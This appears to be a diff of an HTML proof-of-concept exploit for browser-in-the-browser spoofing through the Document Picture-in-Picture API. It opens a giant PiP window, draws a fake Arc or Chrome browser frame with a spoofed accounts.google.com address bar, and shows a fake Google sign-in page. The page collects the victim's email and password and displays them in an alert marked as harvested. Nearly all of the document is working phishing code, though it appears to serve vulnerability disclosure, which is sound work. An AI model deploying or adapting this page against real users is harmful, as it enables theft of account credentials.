@@ -1,135 +1,165 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Site Verification Required</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: #f0f0f0;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-    }
-    h2 { color: #202124; margin-bottom: 12px; }
-    p { color: #e53935; font-size: 13px; margin-bottom: 20px; }
-    button {
-      padding: 14px 32px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      background: #e53935;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-family: inherit;
-    }
-    button:hover { background: #c62828; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Arc Browser BiB Attack</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            display: flex; flex-direction: column; justify-content: center;
+            align-items: center; height: 100vh; background: #1a191f;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif; color: white;
+        }
+        h2 { margin-bottom: 12px; }
+        p { color: #ff5f57; font-size: 13px; margin-bottom: 20px; text-align: center; max-width: 400px; line-height: 1.5; }
+        button {
+            padding: 6px 12px; font-size: 11px; font-weight: 600; cursor: pointer;
+            background: #ff5f57; color: white; border: none; border-radius: 4px; font-family: inherit;
+            transform: translateX(-150px); /* Geser tombol eksploit agak ke kiri */
+        }
+        button:hover { background: #e04a43; }
+    </style>
 </head>
 <body>
 
-  <h2>Site Verification Required</h2>
-  <p>🔴 VULNERABLE — PiP 2000×2000 (Address bar hidden)</p>
-  <button onclick="openPip()">Verify</button>
+    <h2>Arc Fullscreen BiB Spoofing</h2>
+    <p>🔴 VULNERABLE — Click below to trigger the 2500x2500 PiP exploit and launch the fake Arc Browser GUI.</p>
+    <button onclick="openArcPip(event)">Launch Exploit</button>
 
-  <script>
-    function getBiB() {
-      return `<style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family:-apple-system,BlinkMacSystemFont,sans-serif; background:#202124; overflow:hidden; -webkit-font-smoothing:antialiased; }
-        .title-bar { height:38px; background:#292b2f; display:flex; align-items:center; padding:0 12px; }
-        .tl { display:flex; gap:8px; }
-        .tl span { width:12px; height:12px; border-radius:50%; display:inline-block; }
-        .tl-r { background:#ff5f57; } .tl-y { background:#febc2e; } .tl-g { background:#28c840; }
-        .tab-bar { height:36px; background:#292b2f; display:flex; align-items:flex-end; padding:0 8px 0 80px; }
-        .tab { height:30px; background:#202124; border-radius:8px 8px 0 0; display:flex; align-items:center; padding:0 14px; gap:8px; min-width:200px; }
-        .tab-fav { width:16px; height:16px; background:url('https://www.google.com/favicon.ico') center/contain no-repeat; }
-        .tab-t { font-size:12px; color:#e8eaed; flex:1; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; }
-        .tab-x { font-size:14px; color:#9aa0a6; cursor:pointer; }
-        .omni-row { height:42px; background:#202124; display:flex; align-items:center; padding:0 12px; gap:10px; }
-        .nav { color:#9aa0a6; font-size:18px; width:28px; text-align:center; user-select:none; }
-        .omni { flex:1; height:30px; background:#303134; border-radius:15px; display:flex; align-items:center; padding:0 14px; gap:8px; }
-        .lock { color:#9aa0a6; font-size:14px; }
-        .url { font-size:13px; }
-        .url-d { color:#e8eaed; } .url-p { color:#9aa0a6; }
-        .omni-a { display:flex; gap:8px; color:#9aa0a6; font-size:16px; }
-        .bm-bar { height:28px; background:#202124; display:flex; align-items:center; padding:0 12px; border-bottom:1px solid #3c4043; gap:4px; }
-        .bm { font-size:11px; color:#9aa0a6; padding:4px 8px; white-space:nowrap; }
-        .page { background:#f8f9fa; min-height:calc(100vh - 144px); display:flex; align-items:center; justify-content:center; }
-        .card { background:white; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,.12); padding:48px 40px 36px; width:400px; max-width:90%; text-align:center; }
-        .card img { width:75px; margin-bottom:20px; }
-        .card h1 { font-size:24px; font-weight:400; color:#202124; margin-bottom:4px; }
-        .card .sub { font-size:16px; color:#202124; margin-bottom:28px; }
-        .inp { width:100%; padding:13px 15px; font-size:16px; font-family:inherit; border:1px solid #dadce0; border-radius:4px; outline:none; color:#202124; margin-bottom:12px; }
-        .inp:focus { border-color:#1a73e8; border-width:2px; padding:12px 14px; }
-        .fl { display:block; text-align:left; color:#1a73e8; text-decoration:none; font-size:14px; font-weight:500; margin-bottom:28px; }
-        .ht { font-size:14px; color:#5f6368; text-align:left; margin-bottom:32px; line-height:1.5; }
-        .ht a { color:#1a73e8; text-decoration:none; }
-        .br { display:flex; justify-content:space-between; align-items:center; }
-        .cl { color:#1a73e8; text-decoration:none; font-size:14px; font-weight:500; }
-        .nb { background:#1a73e8; color:white; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; font-family:inherit; }
-        .nb:hover { background:#1765cc; }
-        .ft { display:flex; justify-content:space-between; margin-top:40px; align-items:center; }
-        .ft select { border:none; background:transparent; color:#5f6368; font-size:13px; }
-        .ft a { color:#5f6368; text-decoration:none; font-size:13px; margin-left:16px; }
-      </style>
-      <div class="title-bar"><div class="tl"><span class="tl-r"></span><span class="tl-y"></span><span class="tl-g"></span></div></div>
-      <div class="tab-bar"><div class="tab"><div class="tab-fav"></div><span class="tab-t">Sign in - Google Accounts</span><span class="tab-x">×</span></div></div>
-      <div class="omni-row"><span class="nav">‹</span><span class="nav">›</span><span class="nav">⟳</span><div class="omni"><span class="lock">🔒</span><span class="url"><span class="url-d">accounts.google.com</span><span class="url-p">/signin/v2/identifier</span></span></div><div class="omni-a"><span>☆</span><span>⋮</span></div></div>
-      <div class="bm-bar"><span class="bm">📁 Gmail</span><span class="bm">📁 YouTube</span><span class="bm">📁 Drive</span><span class="bm">📁 Calendar</span></div>
-      <div class="page"><div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-        <h1>Sign in</h1>
-        <p class="sub">Use your Google Account</p>
-        <input class="inp" type="email" placeholder="Email or phone" id="bib-email">
-        <a href="#" class="fl">Forgot email?</a>
-        <p class="ht">Not your computer? Use a private browsing window to sign in. <a href="#">Learn more about using Guest mode</a></p>
-        <div class="br"><a href="#" class="cl">Create account</a><button class="nb" id="bib-next">Next</button></div>
-        <div class="ft"><select><option>English (United States)</option></select><div><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div></div>
-      </div></div>`;
+    <script>
+        function getArcBiB(offsetX, offsetY, screenW, screenH) {
+            return `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
+    body { background: #000; overflow: hidden; color: white; -webkit-font-smoothing: antialiased; margin: 0; }
+    
+    /* Perfect Screen Dimension Mapping Container */
+    #kiosk {
+        position: absolute;
+        left: ${offsetX}px;
+        top: ${offsetY}px;
+        width: ${screenW}px;
+        height: ${screenH}px;
+        display: flex;
+        background: #1a191f;
     }
 
-    async function openPip() {
-      try {
-        const pip = await documentPictureInPicture.requestWindow({
-          width: 2000,
-          height: 2000,
-        });
-        pip.document.body.innerHTML = getBiB();
+    /* Arc Sidebar replaced with Image */
+    .sidebar { width: 260px; display: flex; flex-direction: column; flex-shrink: 0; background-color: #1a191f; background-image: url('file:///Users/aryautomo122icloud.com/.gemini/antigravity/brain/adfa1bee-228b-4412-a604-cb46b96ddb25/media__1776095462976.png'); background-size: 100% auto; background-position: left 45%; background-repeat: no-repeat; }
+    
+    /* Main Webview (The Fake Website area) */
+    .webview-container { flex: 1; background: #ffffff; border-radius: 10px; margin: 8px 8px 8px 0; display: flex; align-items: center; justify-content: center; position: relative; box-shadow: 0 10px 40px rgba(0,0,0,0.5); overflow: hidden; }
+    
+    /* Google Sign-in Card inside Webview */
+    .g-card { background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 448px; text-align: center; }
+    .g-card img.logo { width: 74px; margin-bottom: 16px; }
+    .g-card h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+    .g-card p.sub { font-size: 16px; color: #202124; margin-bottom: 32px; font-weight: 400; }
+    .input-wrap { text-align: left; }
+    .inp { width: 100%; padding: 13px 15px; font-size: 16px; color: #202124; border: 1px solid #dadce0; border-radius: 4px; outline: none; margin-bottom: 10px; }
+    .inp:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+    .forgot { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; display: inline-block; margin-bottom: 40px; }
+    .actions { display: flex; justify-content: space-between; align-items: center; }
+    .actions a { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
+    .btn-next { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+    .btn-next:hover { background: #1765cc; }
+</style>
+</head>
+<body>
+    <div id="kiosk">
+        <!-- ARC SIDEBAR (Image based) -->
+        <div class="sidebar"></div>
+        
+        <!-- ARC WEBVIEW (Where the content goes) -->
+        <div class="webview-container">
+            <div class="g-card">
+                <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+                <h1>Sign in</h1>
+                <p class="sub">Use your Google Account</p>
+                
+                <div class="input-wrap">
+                    <input type="email" class="inp" id="stolen-email" placeholder="Email or phone" autocomplete="off">
+                    <a href="#" class="forgot">Forgot email?</a>
+                </div>
+                
+                <p style="text-align:left; font-size:14px; color:#5f6368; line-height:1.5; margin-bottom:32px;">
+                    Not your computer? Use a private browsing window to sign in. <a href="#" style="color:#1a73e8; text-decoration:none;">Learn more</a>
+                </p>
+                
+                <div class="actions">
+                    <a href="#">Create account</a>
+                    <button class="btn-next" id="btn-submit">Next</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+            `;
+        }
 
-        const nextBtn = pip.document.getElementById('bib-next');
-        const emailInput = pip.document.getElementById('bib-email');
-        if (!nextBtn || !emailInput) return;
+        async function openArcPip(e) {
+            try {
+                // Dimensi raksasa untuk memicu eksploitasi Kiosk Mode
+                const pipW = 2500;
+                const pipH = 2500;
 
-        nextBtn.addEventListener('click', () => {
-          const email = emailInput.value;
-          if (!email) return;
-          emailInput.style.display = 'none';
-          const pw = pip.document.createElement('input');
-          pw.className = 'inp'; pw.type = 'password'; pw.placeholder = 'Enter your password'; pw.id = 'bib-pw';
-          emailInput.parentNode.insertBefore(pw, emailInput.nextSibling);
-          pw.focus();
-          pip.document.querySelector('.card h1').textContent = 'Welcome';
-          pip.document.querySelector('.card .sub').innerHTML = '<div style="display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border:1px solid #dadce0;border-radius:16px;font-size:14px;color:#3c4043;">👤 ' + email + '</div>';
-          pip.document.querySelector('.fl').textContent = 'Forgot password?';
+                // Mengkalkulasi offset letak fisik monitor berdasarkan pusat titik klik kursor
+                const offsetX = (pipW / 2) - e.screenX;
+                const offsetY = (pipH / 2) - e.screenY;
 
-          nextBtn.addEventListener('click', () => {
-            const p = pip.document.getElementById('bib-pw');
-            if (p && p.value) {
-              alert('🚨 CREDENTIALS HARVESTED (VULNERABLE - 1000x1000)\n\nEmail: ' + email + '\nPassword: ' + p.value + '\n\nAddress bar: HIDDEN ❌\nUser saw only fake BiB chrome');
+                const pip = await documentPictureInPicture.requestWindow({
+                    width: pipW,
+                    height: pipH,
+                });
+
+                // Write fake UI dengan layout presisi yang dimapping dengan ukuran monitor target 
+                // offsetX dan offsetY mengompensasi otomatis posisi window hasil pentalan OS
+                pip.document.open();
+                pip.document.write(getArcBiB(Math.max(0, offsetX), Math.max(0, offsetY), window.screen.width, window.screen.height));
+                pip.document.close();
+
+                // Exploit logic: Steal the credential
+                const submitBtn = pip.document.getElementById('btn-submit');
+                const emailInput = pip.document.getElementById('stolen-email');
+
+                if (submitBtn && emailInput) {
+                    submitBtn.addEventListener('click', () => {
+                        const email = emailInput.value;
+                        if (email) {
+                            // First step capture
+                            emailInput.style.display = 'none';
+                            const pwInput = pip.document.createElement('input');
+                            pwInput.type = 'password';
+                            pwInput.className = 'inp';
+                            pwInput.placeholder = 'Enter your password';
+                            pwInput.id = 'stolen-pw';
+                            emailInput.parentNode.insertBefore(pwInput, emailInput.nextSibling);
+                            pwInput.focus();
+                            
+                            // Visual updates for fake Google flow
+                            pip.document.querySelector('.g-card h1').textContent = 'Welcome';
+                            pip.document.querySelector('.g-card .sub').innerHTML = '<div style="display:inline-flex;align-items:center;padding:4px 12px;border:1px solid #dadce0;border-radius:16px;font-size:14px;font-weight:500;color:#3c4043;">👤 ' + email + '</div>';
+                            pip.document.querySelector('.forgot').textContent = 'Forgot password?';
+
+                            submitBtn.addEventListener('click', () => {
+                                const pw = pip.document.getElementById('stolen-pw');
+                                if (pw && pw.value) {
+                                    alert('🚨 ARC FULLSCREEN SPOOF SUCCESS\\n\\nHarvested Credentials:\\nEmail: ' + email + '\\nPassword: ' + pw.value);
+                                }
+                            }, { once: true });
+                        }
+                    }, { once: true });
+                }
+
+            } catch (err) {
+                alert('Error PiP: ' + err.message + '\\n(Ensure you launched a fresh browser session for the bug to trigger.)');
             }
-          }, { once: true });
-        }, { once: true });
-
-      } catch (e) {
-        alert('Error: ' + e.message);
-      }
-    }
-  </script>
+        }
+    </script>
 </body>
 </html>
